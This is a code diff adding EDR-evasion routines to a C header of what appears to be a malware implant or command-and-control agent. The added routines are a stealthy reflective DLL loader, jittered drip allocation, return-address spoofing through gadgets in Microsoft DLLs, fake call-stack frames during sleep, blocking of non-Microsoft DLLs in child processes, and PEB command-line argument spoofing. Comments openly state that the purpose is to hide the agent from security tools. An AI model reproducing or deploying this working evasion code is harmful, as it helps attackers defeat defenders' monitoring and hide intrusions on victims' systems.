@@ -543,4 +543,638 @@ static int unhook_ntdll(void) {
 #include "syscall.h"
 #endif
 
+/* ================================================================== */
+/* UDRL — User-Defined Reflective Loader  (#103)                       */
+/*                                                                      */
+/* Maps a raw DLL from memory without touching the PEB module list.    */
+/* Parses PE headers, copies sections, processes relocations, resolves */
+/* imports, sets per-section protections, and calls DllMain.           */
+/* The loaded module is invisible to EnumProcessModules / toolhelp32.  */
+/* ================================================================== */
+
+#ifndef ENABLE_UDRL
+#define ENABLE_UDRL 1
+#endif
+
+#if ENABLE_UDRL
+
+static LPVOID udrl_map_dll(BYTE *rawDll, SIZE_T dllSize) {
+    if (!rawDll || dllSize < sizeof(IMAGE_DOS_HEADER))
+        return NULL;
+
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawDll;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+        return NULL;
+
+    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawDll + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE)
+        return NULL;
+
+    SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
+    BYTE *base = (BYTE *)VirtualAlloc(NULL, imgSize,
+                                       MEM_RESERVE | MEM_COMMIT,
+                                       PAGE_READWRITE);
+    if (!base) return NULL;
+
+    /* Copy PE headers */
+    memcpy(base, rawDll, nt->OptionalHeader.SizeOfHeaders);
+
+    /* Copy each section */
+    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (sec[i].SizeOfRawData == 0) continue;
+        memcpy(base + sec[i].VirtualAddress,
+               rawDll + sec[i].PointerToRawData,
+               sec[i].SizeOfRawData);
+    }
+
+    /* Process base relocations */
+    ULONGLONG delta = (ULONGLONG)(base - nt->OptionalHeader.ImageBase);
+    if (delta != 0) {
+        DWORD relocRva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+        DWORD relocSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+        if (relocRva && relocSize) {
+            IMAGE_BASE_RELOCATION *block = (IMAGE_BASE_RELOCATION *)(base + relocRva);
+            while ((BYTE *)block < base + relocRva + relocSize && block->SizeOfBlock) {
+                DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                WORD *entry = (WORD *)((BYTE *)block + sizeof(IMAGE_BASE_RELOCATION));
+                for (DWORD j = 0; j < count; j++) {
+                    WORD type   = entry[j] >> 12;
+                    WORD offset = entry[j] & 0x0FFF;
+                    BYTE *patch = base + block->VirtualAddress + offset;
+                    switch (type) {
+                        case IMAGE_REL_BASED_DIR64:
+                            *(ULONGLONG *)patch += delta;
+                            break;
+                        case IMAGE_REL_BASED_HIGHLOW:
+                            *(DWORD *)patch += (DWORD)delta;
+                            break;
+                        case IMAGE_REL_BASED_HIGH:
+                            *(WORD *)patch += HIWORD(delta);
+                            break;
+                        case IMAGE_REL_BASED_LOW:
+                            *(WORD *)patch += LOWORD(delta);
+                            break;
+                        case IMAGE_REL_BASED_ABSOLUTE:
+                        default:
+                            break;
+                    }
+                }
+                block = (IMAGE_BASE_RELOCATION *)((BYTE *)block + block->SizeOfBlock);
+            }
+        }
+    }
+
+    /* Resolve imports */
+    DWORD impRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+    if (impRva) {
+        IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + impRva);
+        while (imp->Name) {
+            char *modName = (char *)(base + imp->Name);
+            HMODULE hMod  = LoadLibraryA(modName);
+            if (!hMod) { imp++; continue; }
+
+            ULONGLONG *thunk = (ULONGLONG *)(base + (imp->OriginalFirstThunk
+                                   ? imp->OriginalFirstThunk : imp->FirstThunk));
+            ULONGLONG *iat   = (ULONGLONG *)(base + imp->FirstThunk);
+
+            while (*thunk) {
+                if (IMAGE_SNAP_BY_ORDINAL64(*thunk)) {
+                    *iat = (ULONGLONG)GetProcAddress(hMod,
+                                MAKEINTRESOURCEA(IMAGE_ORDINAL64(*thunk)));
+                } else {
+                    IMAGE_IMPORT_BY_NAME *ibn =
+                        (IMAGE_IMPORT_BY_NAME *)(base + (DWORD)*thunk);
+                    *iat = (ULONGLONG)GetProcAddress(hMod, ibn->Name);
+                }
+                thunk++;
+                iat++;
+            }
+            imp++;
+        }
+    }
+
+    /* Set per-section protections */
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        DWORD prot = PAGE_READONLY;
+        DWORD ch   = sec[i].Characteristics;
+        BOOL exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
+        BOOL write = (ch & IMAGE_SCN_MEM_WRITE)   != 0;
+        if (exec && write)      prot = PAGE_EXECUTE_READWRITE;
+        else if (exec)          prot = PAGE_EXECUTE_READ;
+        else if (write)         prot = PAGE_READWRITE;
+        DWORD old;
+        SIZE_T secSize = sec[i].Misc.VirtualSize;
+        if (secSize == 0) secSize = sec[i].SizeOfRawData;
+        if (secSize)
+            VirtualProtect(base + sec[i].VirtualAddress, secSize, prot, &old);
+    }
+
+    /* Call DllMain(DLL_PROCESS_ATTACH) */
+    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
+    if (nt->OptionalHeader.AddressOfEntryPoint) {
+        DllMain_t entry = (DllMain_t)(base + nt->OptionalHeader.AddressOfEntryPoint);
+        entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
+    }
+
+    return (LPVOID)base;
+}
+
+#else /* ENABLE_UDRL == 0 */
+static LPVOID udrl_map_dll(BYTE *rawDll, SIZE_T dllSize) {
+    (void)rawDll; (void)dllSize; return NULL;
+}
+#endif /* ENABLE_UDRL */
+
+/* ================================================================== */
+/* Drip-Loading  (#104)                                                 */
+/*                                                                      */
+/* Allocates memory in small 4 KB chunks with randomised inter-chunk   */
+/* delays (50-500 ms). This defeats EDR heuristics that flag large     */
+/* single VirtualAlloc calls followed by immediate writes.             */
+/* After all pages are committed, the final protection is applied.     */
+/* ================================================================== */
+
+#ifndef ENABLE_DRIP_LOAD
+#define ENABLE_DRIP_LOAD 1
+#endif
+
+#if ENABLE_DRIP_LOAD
+
+static LPVOID drip_alloc(SIZE_T totalSize, DWORD protect) {
+    if (totalSize == 0) return NULL;
+
+    SIZE_T pageSize  = 0x1000;
+    SIZE_T aligned   = (totalSize + pageSize - 1) & ~(pageSize - 1);
+    SIZE_T numPages  = aligned / pageSize;
+
+    /* Reserve the full region up front so pages are contiguous */
+    BYTE *region = (BYTE *)VirtualAlloc(NULL, aligned, MEM_RESERVE, PAGE_NOACCESS);
+    if (!region) return NULL;
+
+    DWORD seed = GetTickCount() ^ GetCurrentProcessId();
+
+    for (SIZE_T i = 0; i < numPages; i++) {
+        LPVOID page = VirtualAlloc(region + i * pageSize, pageSize,
+                                   MEM_COMMIT, PAGE_READWRITE);
+        if (!page) {
+            VirtualFree(region, 0, MEM_RELEASE);
+            return NULL;
+        }
+
+        /* Jittered delay: 50 + (rand % 451) => [50, 500] ms */
+        seed ^= seed << 13; seed ^= seed >> 17; seed ^= seed << 5;
+        DWORD delay = 50 + (seed % 451);
+        Sleep(delay);
+    }
+
+    /* Apply the requested final protection */
+    if (protect != PAGE_READWRITE) {
+        DWORD old;
+        VirtualProtect(region, aligned, protect, &old);
+    }
+
+    return (LPVOID)region;
+}
+
+#else /* ENABLE_DRIP_LOAD == 0 */
+static LPVOID drip_alloc(SIZE_T totalSize, DWORD protect) {
+    (void)totalSize; (void)protect; return NULL;
+}
+#endif /* ENABLE_DRIP_LOAD */
+
+/* ================================================================== */
+/* Return Address Spoofing  (#105)  —  x64 only                        */
+/*                                                                      */
+/* Replaces the real return address on the stack with a pointer to a   */
+/* RET (0xC3) gadget inside a legitimate Microsoft DLL. EDR call-stack */
+/* walkers see only Microsoft frames, hiding the agent's code.         */
+/*                                                                      */
+/* find_ret_gadget() locates a 0xC3 byte in the .text section of the  */
+/* given module. spoof_call() is a GCC inline-asm trampoline that      */
+/* swaps the return address, calls the target, and restores control.   */
+/* ================================================================== */
+
+#ifndef ENABLE_RET_ADDR_SPOOF
+#define ENABLE_RET_ADDR_SPOOF 1
+#endif
+
+#if ENABLE_RET_ADDR_SPOOF
+
+#if defined(__x86_64__) || defined(_M_X64)
+
+static void *find_ret_gadget(HMODULE hMod) {
+    if (!hMod) return NULL;
+
+    BYTE *img = (BYTE *)hMod;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (memcmp(sec[i].Name, ".text", 5) == 0) {
+            BYTE *start = img + sec[i].VirtualAddress;
+            SIZE_T len  = sec[i].Misc.VirtualSize;
+            /* Skip first 16 bytes to avoid hitting the section entry */
+            for (SIZE_T j = 16; j < len; j++) {
+                if (start[j] == 0xC3)
+                    return (void *)(start + j);
+            }
+        }
+    }
+    return NULL;
+}
+
+/*
+ * Trampoline: call `func(arg1)` while the return address visible on
+ * the stack points to `gadget` (a RET inside a signed DLL).
+ *
+ * Microsoft x64 ABI: first arg in RCX. We pass func in RDI, arg1 in
+ * RSI, gadget in RDX (mapped from the C call). GCC inline asm clobbers
+ * are declared so the compiler knows what we touch.
+ */
+static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
+    ULONG_PTR ret_val;
+    __asm__ __volatile__ (
+        /* Save the real return address we need to get back to */
+        "lea   1f(%%rip), %%rax    \n\t"  /* rax = real continuation addr */
+        "push  %%rax               \n\t"  /* save it below the fake frame */
+        "push  %%rbp               \n\t"  /* save frame pointer           */
+        "mov   %%rsp, %%rbp        \n\t"
+
+        /* Build a fake frame: when `func` returns, it RETs into gadget,
+           and gadget (a bare 0xC3) RETs into our saved real address.    */
+        "push  %%rdx               \n\t"  /* gadget addr = fake retaddr  */
+        "mov   %%rsi, %%rcx        \n\t"  /* arg1 -> RCX (MS ABI)       */
+        "sub   $0x20, %%rsp        \n\t"  /* shadow space                */
+        "call  *%%rdi              \n\t"  /* call func                   */
+        "add   $0x20, %%rsp        \n\t"
+        "add   $0x8,  %%rsp        \n\t"  /* pop the gadget slot         */
+
+        "mov   %%rbp, %%rsp        \n\t"  /* restore stack               */
+        "pop   %%rbp               \n\t"
+        "add   $0x8,  %%rsp        \n\t"  /* pop saved real ret addr     */
+        "1:                        \n\t"
+        : "=a" (ret_val)
+        : "D" (func), "S" (arg1), "d" (gadget)
+        : "rcx", "r8", "r9", "r10", "r11", "memory", "cc"
+    );
+    return ret_val;
+}
+
+#else
+/* x86 / other arch: stubs */
+static void *find_ret_gadget(HMODULE hMod) { (void)hMod; return NULL; }
+static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
+    (void)gadget;
+    typedef ULONG_PTR (*fn_t)(void *);
+    return ((fn_t)func)(arg1);
+}
+#endif /* x86_64 */
+
+#else /* ENABLE_RET_ADDR_SPOOF == 0 */
+static void *find_ret_gadget(HMODULE hMod) { (void)hMod; return NULL; }
+static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
+    (void)gadget;
+    typedef ULONG_PTR (*fn_t)(void *);
+    return ((fn_t)func)(arg1);
+}
+#endif /* ENABLE_RET_ADDR_SPOOF */
+
+/* ================================================================== */
+/* Synthetic Stack Frames  (#106)                                       */
+/*                                                                      */
+/* Fabricates a plausible call-stack chain during sleep so that EDR    */
+/* thread-stack scanners see only legitimate Windows frames.           */
+/*                                                                      */
+/* Before sleeping: synth_frames_push() saves the real RSP/RBP and    */
+/* builds a fake frame chain through RtlUserThreadStart →             */
+/* BaseThreadInitThunk. After waking: synth_frames_pop() restores the */
+/* original stack pointers.                                             */
+/* ================================================================== */
+
+#ifndef ENABLE_SYNTHETIC_FRAMES
+#define ENABLE_SYNTHETIC_FRAMES 1
+#endif
+
+#if ENABLE_SYNTHETIC_FRAMES
+
+#if defined(__x86_64__) || defined(_M_X64)
+
+static struct {
+    void *rtl_user_thread_start;
+    void *base_thread_init_thunk;
+    ULONG_PTR saved_rsp;
+    ULONG_PTR saved_rbp;
+    BYTE frame_buf[256];
+} g_synth;
+
+static void synth_frames_init(void) {
+    HMODULE hNtdll   = GetModuleHandleA("ntdll.dll");
+    HMODULE hKernel  = GetModuleHandleA("kernel32.dll");
+
+    if (hNtdll)
+        g_synth.rtl_user_thread_start =
+            (void *)GetProcAddress(hNtdll, "RtlUserThreadStart");
+    if (hKernel)
+        g_synth.base_thread_init_thunk =
+            (void *)GetProcAddress(hKernel, "BaseThreadInitThunk");
+}
+
+static void synth_frames_push(void) {
+    /* Save real stack state */
+    __asm__ __volatile__ (
+        "mov %%rsp, %0 \n\t"
+        "mov %%rbp, %1 \n\t"
+        : "=m" (g_synth.saved_rsp), "=m" (g_synth.saved_rbp)
+        :
+        : "memory"
+    );
+
+    /*
+     * Build a fake RBP chain in frame_buf:
+     *   frame_buf[0..7]   = fake prev-RBP (points to frame_buf+16)
+     *   frame_buf[8..15]  = fake return addr -> BaseThreadInitThunk
+     *   frame_buf[16..23] = NULL prev-RBP (end of chain)
+     *   frame_buf[24..31] = fake return addr -> RtlUserThreadStart
+     */
+    ULONG_PTR *fb = (ULONG_PTR *)g_synth.frame_buf;
+    fb[0] = (ULONG_PTR)&fb[2];                                  /* prev RBP -> next frame */
+    fb[1] = (ULONG_PTR)g_synth.base_thread_init_thunk;          /* fake ret addr          */
+    fb[2] = 0;                                                   /* chain terminator       */
+    fb[3] = (ULONG_PTR)g_synth.rtl_user_thread_start;           /* final fake ret addr    */
+
+    /* Point RBP into our fake chain */
+    __asm__ __volatile__ (
+        "mov %0, %%rbp \n\t"
+        :
+        : "r" ((ULONG_PTR)&fb[0])
+        : "memory"
+    );
+}
+
+static void synth_frames_pop(void) {
+    __asm__ __volatile__ (
+        "mov %0, %%rsp \n\t"
+        "mov %1, %%rbp \n\t"
+        :
+        : "m" (g_synth.saved_rsp), "m" (g_synth.saved_rbp)
+        : "memory"
+    );
+}
+
+#else
+/* x86 / other arch: stubs */
+static void synth_frames_init(void) {}
+static void synth_frames_push(void) {}
+static void synth_frames_pop(void) {}
+#endif /* x86_64 */
+
+#else /* ENABLE_SYNTHETIC_FRAMES == 0 */
+static void synth_frames_init(void) {}
+static void synth_frames_push(void) {}
+static void synth_frames_pop(void) {}
+#endif /* ENABLE_SYNTHETIC_FRAMES */
+
+/* ================================================================== */
+/* BlockDLLs  (#110)                                                    */
+/*                                                                      */
+/* Creates child processes with                                        */
+/* PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES     */
+/* so that third-party EDR DLLs cannot inject into spawned processes.  */
+/* Toggled at runtime via g_block_dlls.                                 */
+/* Falls back to normal CreateProcessA if attribute setup fails.       */
+/* ================================================================== */
+
+#ifndef ENABLE_BLOCK_DLLS
+#define ENABLE_BLOCK_DLLS 1
+#endif
+
+#if ENABLE_BLOCK_DLLS
+
+static int g_block_dlls = 0;
+
+#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
+#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
+#endif
+
+static BOOL create_process_block_dlls(const char *cmdline,
+                                      HANDLE hStdOut, HANDLE hStdErr,
+                                      PROCESS_INFORMATION *pi) {
+    BOOL  result = FALSE;
+    SIZE_T attrSize = 0;
+    LPPROC_THREAD_ATTRIBUTE_LIST attrList = NULL;
+
+    /* Convert narrow cmdline to wide */
+    int wlen = MultiByteToWideChar(CP_ACP, 0, cmdline, -1, NULL, 0);
+    if (wlen <= 0) goto blk_fallback;
+    WCHAR *wcmd = (WCHAR *)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(WCHAR));
+    if (!wcmd) goto blk_fallback;
+    MultiByteToWideChar(CP_ACP, 0, cmdline, -1, wcmd, wlen);
+
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+    attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
+                                                        HEAP_ZERO_MEMORY,
+                                                        attrSize);
+    if (!attrList) { HeapFree(GetProcessHeap(), 0, wcmd); goto blk_fallback; }
+
+    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
+        HeapFree(GetProcessHeap(), 0, attrList);
+        HeapFree(GetProcessHeap(), 0, wcmd);
+        goto blk_fallback;
+    }
+
+    DWORD64 policy = 0x100000000000ULL; /* BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON */
+    if (!UpdateProcThreadAttribute(attrList, 0,
+                                   PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                                   &policy, sizeof(policy), NULL, NULL)) {
+        DeleteProcThreadAttributeList(attrList);
+        HeapFree(GetProcessHeap(), 0, attrList);
+        HeapFree(GetProcessHeap(), 0, wcmd);
+        goto blk_fallback;
+    }
+
+    STARTUPINFOEXW siex;
+    ZeroMemory(&siex, sizeof(siex));
+    siex.StartupInfo.cb          = sizeof(siex);
+    siex.StartupInfo.dwFlags     = STARTF_USESTDHANDLES;
+    siex.StartupInfo.hStdOutput  = hStdOut;
+    siex.StartupInfo.hStdError   = hStdErr;
+    siex.lpAttributeList         = attrList;
+
+    result = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
+                            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+                            NULL, NULL,
+                            (LPSTARTUPINFOW)&siex, pi);
+
+    DeleteProcThreadAttributeList(attrList);
+    HeapFree(GetProcessHeap(), 0, attrList);
+    HeapFree(GetProcessHeap(), 0, wcmd);
+    return result;
+
+blk_fallback:
+    {
+        STARTUPINFOA si;
+        ZeroMemory(&si, sizeof(si));
+        si.cb          = sizeof(si);
+        si.dwFlags     = STARTF_USESTDHANDLES;
+        si.hStdOutput  = hStdOut;
+        si.hStdError   = hStdErr;
+        return CreateProcessA(NULL, (LPSTR)cmdline, NULL, NULL, TRUE,
+                              CREATE_NO_WINDOW, NULL, NULL, &si, pi);
+    }
+}
+
+#else /* ENABLE_BLOCK_DLLS == 0 */
+static int g_block_dlls = 0;
+static BOOL create_process_block_dlls(const char *cmdline,
+                                      HANDLE hStdOut, HANDLE hStdErr,
+                                      PROCESS_INFORMATION *pi) {
+    (void)cmdline; (void)hStdOut; (void)hStdErr; (void)pi;
+    return FALSE;
+}
+#endif /* ENABLE_BLOCK_DLLS */
+
+/* ================================================================== */
+/* Argument Spoofing  (#111)                                            */
+/*                                                                      */
+/* Creates a child process with fake (benign) command-line arguments,  */
+/* then overwrites the real arguments into the PEB of the suspended    */
+/* process before resuming it. EDR process-creation telemetry records  */
+/* only the decoy arguments.                                           */
+/*                                                                      */
+/* Flow:                                                                */
+/*   1. CreateProcessW with decoy args + CREATE_SUSPENDED              */
+/*   2. NtQueryInformationProcess → PEB address                        */
+/*   3. ReadProcessMemory → ProcessParameters → CommandLine            */
+/*   4. WriteProcessMemory to overwrite CommandLine.Buffer + Length     */
+/*   5. ResumeThread                                                    */
+/* ================================================================== */
+
+#ifndef ENABLE_ARG_SPOOF
+#define ENABLE_ARG_SPOOF 1
+#endif
+
+#if ENABLE_ARG_SPOOF
+
+static int g_arg_spoof = 0;
+
+typedef struct _APEX_PROCESS_BASIC_INFORMATION {
+    PVOID     Reserved1;
+    PVOID     PebBaseAddress;
+    PVOID     Reserved2[2];
+    ULONG_PTR UniqueProcessId;
+    PVOID     Reserved3;
+} APEX_PROCESS_BASIC_INFORMATION;
+
+typedef NTSTATUS (WINAPI *pfnNtQueryInformationProcess_t)(
+    HANDLE, ULONG, PVOID, ULONG, PULONG);
+
+static BOOL create_process_arg_spoof(const char *realCmd,
+                                     HANDLE hStdOut, HANDLE hStdErr,
+                                     PROCESS_INFORMATION *pi) {
+    /* Resolve NtQueryInformationProcess from ntdll */
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return FALSE;
+
+    char szNtQip[] = {'N','t','Q','u','e','r','y','I','n','f','o','r','m',
+                      'a','t','i','o','n','P','r','o','c','e','s','s',0};
+    pfnNtQueryInformationProcess_t pNtQip =
+        (pfnNtQueryInformationProcess_t)GetProcAddress(hNtdll, szNtQip);
+    if (!pNtQip) return FALSE;
+
+    /* Decoy command line */
+    WCHAR wFake[] = L"cmd.exe /c echo ok";
+
+    STARTUPINFOW si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESTDHANDLES;
+    si.hStdOutput  = hStdOut;
+    si.hStdError   = hStdErr;
+
+    if (!CreateProcessW(NULL, wFake, NULL, NULL, TRUE,
+                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                        NULL, NULL, &si, pi))
+        return FALSE;
+
+    /* Read PEB address from the suspended process */
+    APEX_PROCESS_BASIC_INFORMATION pbi;
+    ZeroMemory(&pbi, sizeof(pbi));
+    ULONG retLen = 0;
+    NTSTATUS st = pNtQip(pi->hProcess, 0 /* ProcessBasicInformation */,
+                         &pbi, sizeof(pbi), &retLen);
+    if (!NT_SUCCESS(st)) goto spoof_fail;
+
+    /* Read ProcessParameters pointer from PEB (offset 0x20 on x64) */
+    PVOID pebAddr = pbi.PebBaseAddress;
+    PVOID procParams = NULL;
+    SIZE_T bytesRead = 0;
+    if (!ReadProcessMemory(pi->hProcess,
+                           (BYTE *)pebAddr + 0x20,
+                           &procParams, sizeof(procParams), &bytesRead))
+        goto spoof_fail;
+
+    /* Convert real args to wide */
+    int wRealLen = MultiByteToWideChar(CP_ACP, 0, realCmd, -1, NULL, 0);
+    if (wRealLen <= 0) goto spoof_fail;
+    WCHAR *wReal = (WCHAR *)HeapAlloc(GetProcessHeap(), 0,
+                                       wRealLen * sizeof(WCHAR));
+    if (!wReal) goto spoof_fail;
+    MultiByteToWideChar(CP_ACP, 0, realCmd, -1, wReal, wRealLen);
+
+    /*
+     * RTL_USER_PROCESS_PARAMETERS layout (x64):
+     *   offset 0x70: CommandLine (UNICODE_STRING)
+     *     .Length        (USHORT) at +0x70
+     *     .MaximumLength (USHORT) at +0x72
+     *     .Buffer        (PWSTR)  at +0x78
+     */
+    PVOID cmdLineBufPtr = NULL;
+    if (!ReadProcessMemory(pi->hProcess,
+                           (BYTE *)procParams + 0x78,
+                           &cmdLineBufPtr, sizeof(cmdLineBufPtr), &bytesRead))
+        goto spoof_fail_free;
+
+    /* Overwrite the command-line buffer in the target process */
+    SIZE_T realByteLen = (SIZE_T)(wRealLen - 1) * sizeof(WCHAR);
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(pi->hProcess, cmdLineBufPtr,
+                            wReal, realByteLen + sizeof(WCHAR), &written))
+        goto spoof_fail_free;
+
+    /* Update CommandLine.Length */
+    USHORT newLength = (USHORT)realByteLen;
+    WriteProcessMemory(pi->hProcess,
+                       (BYTE *)procParams + 0x70,
+                       &newLength, sizeof(newLength), &written);
+
+    HeapFree(GetProcessHeap(), 0, wReal);
+    ResumeThread(pi->hThread);
+    return TRUE;
+
+spoof_fail_free:
+    HeapFree(GetProcessHeap(), 0, wReal);
+spoof_fail:
+    TerminateProcess(pi->hProcess, 1);
+    CloseHandle(pi->hProcess);
+    CloseHandle(pi->hThread);
+    pi->hProcess = NULL;
+    pi->hThread  = NULL;
+    return FALSE;
+}
+
+#else /* ENABLE_ARG_SPOOF == 0 */
+static int g_arg_spoof = 0;
+static BOOL create_process_arg_spoof(const char *realCmd,
+                                     HANDLE hStdOut, HANDLE hStdErr,
+                                     PROCESS_INFORMATION *pi) {
+    (void)realCmd; (void)hStdOut; (void)hStdErr; (void)pi;
+    return FALSE;
+}
+#endif /* ENABLE_ARG_SPOOF */
+
 #endif /* APEX_EVASION_H */
